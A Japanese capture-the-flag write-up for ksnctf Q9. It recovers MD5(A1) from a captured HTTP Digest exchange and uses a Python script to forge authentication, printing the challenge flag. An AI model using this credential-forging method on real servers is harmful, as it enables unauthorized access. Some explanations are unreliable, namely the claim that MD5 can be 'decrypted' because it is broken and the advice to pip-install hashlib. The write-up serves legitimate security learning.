
# Q9 Digest is secure!
## 問題URL
http://ksnctf.sweetduet.info/q/9/q9.pcap

## 概要
pcapファイルが与えられる。  
pcapファイルを開くと`49.212.153.157`に`GET /~q9/`メッセージを送り認証を要求されている様子が見られる。  
認証を突破してサーバにアクセスすれば何とかなるのかなと思い、突破を試みる

なお、pcapファイルないで`flag`の文字列を検索すると16番目のパケットで以下が見つかる。

```
Line-based text data: text/html
    <!DOCTYPE html>\n
      <head>\n
        <meta charset="utf-8">\n
        <title>Q9</title>\n
      </head>\n
      <body>\n
        <p>Congratulations!</p>\n
        <p>The flag is <a href="flag.html">here</a>.</p>\n
      </body>\n
    </html>\n
```
よって、/~q9/ にアクセスすればフラグが表示されることがわかる。

## ダイジェスト認証
pcapファイル9番目のパケットのHTTPヘッダをみると`WWW-Authenticate: Digest` の記述からダイジェスト認証であることがわかる。  
ダイジェスト認証はチャレンジ＆レスポンス型の認証方式である。手順としては
1. サーバがクライアントにランダムな文字列(nonce)を送る
1. クライアントは受け取ったnonceと事前に共有した鍵を用いてresponseを計算し、サーバに送信する
1. サーバは受け取ったresponseとローカルで計算した計算結果を比較する
1. 計算結果が一致すれば、パスワードを知っている正規ユーザと判断し認証成功とする

responseは以下のようにして計算される。

```
A1 = ユーザ名 ":" realm ":" パスワード
A2 = HTTPのメソッド ":" コンテンツのURI
response = MD5( MD5(A1) ":" nonce ":" nc ":" cnonce ":" qop ":" MD5(A2) )
```
要するに、**要求されたnonceに対して正しいresponseを生成できれば認証を突破できる**はずである。

## response を計算する

我々はパスワードを知らないのでMD5(A1)の部分が計算できない。  
そこで、pcapファイルのresponseからMD5(A1)を復号を試みる。  
MD5は本来復号困難な一方向ハッシュ関数であるが、すでに突破方法が発見されている(よって脆弱！)。

### MD5(A1) の復号
pcapファイルの14番目のパケットHTTPヘッダ内の`Authorization`の値は以下  
`Digest username="q9", realm="secret", nonce="bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b", uri="/~q9/", algorithm=MD5, response="c3077454ecf09ecef1d6c1201038cfaf", qop=auth, nc=00000001, cnonce="9691c249745d94fc"`

このうち、`response`の値を復号する。  
MD5の復号はいくつかのwebサイトで利用可能な模様。今回は以下のサイトを用いた  
http://md5decryption.com/  

これにより次を得る。  
`c627e19450db746b739f41b64097d449:bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b:00000001:9691c249745d94fc:auth:31e101310bcd7fae974b921eb148099c`

| フィールド名 | 値 |
| --- | --- |
| MD5(A1) | c627e19450db746b739f41b64097d449|
| nonce | bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b|
| nc | 00000001 |
| cnonce | 9691c249745d94fc |
| qop | auth |
| MD5(A2) | 31e101310bcd7fae974b921eb148099c |

上記表をみるとGETリクエストのヘッダのフィールドがきちんと再生されていることがわかる。  

## フラグ取得スクリプト
MD5(A1)を用いてダイジェスト認証を突破するスクリプトを作成する。  
MD5の計算にはhashlibを用いるので`pip install hashlib` でインストールする。  
なお、実行する前にhttp://ksnctf.sweetduet.info:10080/~q9/ へリクエストが到達するようにしておく必要があるので注意。


```python
import urllib
import hashlib
import urllib.error
import urllib.request

url = 'http://ksnctf.sweetduet.info:10080/~q9/flag.html'

#md5 = hashlib.md5()
username = "q9"
realm = "secret"
nonce = ""
uri = "/~q9/"#flag.html"
algorithm = "MD5"
response = ""
qop = "auth"
nc = "00000001"
cnonce = "9691c249745d94fc"
md5a1 = "c627e19450db746b739f41b64097d449"
a2 = 'GET:' + uri

def getNonce():
    try:
        data = urllib.request.urlopen(url)
        html = data.read()
    except urllib.error.HTTPError as e:
        nonce = e.info()['WWW-Authenticate'].split('"')[3]
        return nonce

def genMD5(str):
    m = hashlib.md5()
    bstr = str.encode()
    m.update(bstr)
    return m.hexdigest()

def genResponse(nonce):
    response = genMD5(md5a1 + ':' + nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + genMD5(a2))
    return response

def genAuthorized(nonce, response):
    authorized = 'Digest username="' + username + '", realm="' + realm + '", nonce="' + nonce + '",uri="' + uri + '", algorithm=' + algorithm + ', response="' + response + '", qop=' + qop + ', nc=' + nc + ', cnonce="' + cnonce + '"'
    return authorized
```

まず、responseを計算するために必要なnonceを取得する。


```python
nonce = getNonce()
response = genResponse(nonce)
auth = genAuthorized(nonce, response)
header = {'Authorization' : auth}
req = urllib.request.Request(url, None, header)
```


```python
try:
    data = urllib.request.urlopen(req)
    html = data.read()
    print(html)
except urllib.error.HTTPError as e:
    print(e.code)
    print(e.info())
```

    b'<!DOCTYPE html>\n  <head>\n    <meta charset="utf-8">\n    <title>Q9</title>\n  </head>\n  <body>\n    <p>FLAG_YBLyivV4WEvC4pp3</p>\n  </body>\n</html>\n'

